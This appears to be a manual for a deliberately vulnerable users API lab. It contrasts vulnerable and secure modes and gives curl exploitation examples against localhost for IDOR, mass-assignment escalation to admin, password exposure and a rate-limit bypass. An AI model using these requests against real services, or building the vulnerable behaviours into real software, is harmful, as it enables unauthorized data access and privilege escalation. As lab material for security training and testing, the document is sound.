# Users Service Manual

## Endpoints
- `GET /users`
- `POST /users`
- `GET /users/{id}`
- `PATCH /users/{id}`
- `GET /users/rate-limit-bypass`

## User Schema
Fields:
- `id`
- `tenant_id`
- `email`
- `role`
- `internal_notes`
- `password`
- `is_premium`

## Vulnerable vs Secure Behavior Matrix

| Area | Vulnerable Mode | Secure Mode |
|---|---|---|
| Object access (`GET /users/{id}`) | No tenant enforcement (IDOR/BOLA) | Enforces `X-Tenant-ID` ownership |
| Create/Update fields | Mass assignment allowed for role/internal/sensitive fields | Server-controlled security fields |
| Sensitive data exposure | `internal_notes` and `password` exposed | Sensitive fields sanitized |
| Rate-limit bypass endpoint | Returns bypass granted | Returns `429` enforced |

## Exploitation Examples

### IDOR/BOLA
Request another tenant user directly:
```bash
curl -s http://localhost:18080/users/2
```

### Mass assignment role escalation
```bash
curl -s -X PATCH http://localhost:18080/users/1 \
  -H 'content-type: application/json' \
  -d '{"role":"admin"}'
```

### Sensitive data exposure
```bash
curl -s http://localhost:18080/users/1
```

### Rate-limit bypass
```bash
curl -s http://localhost:18080/users/rate-limit-bypass
```
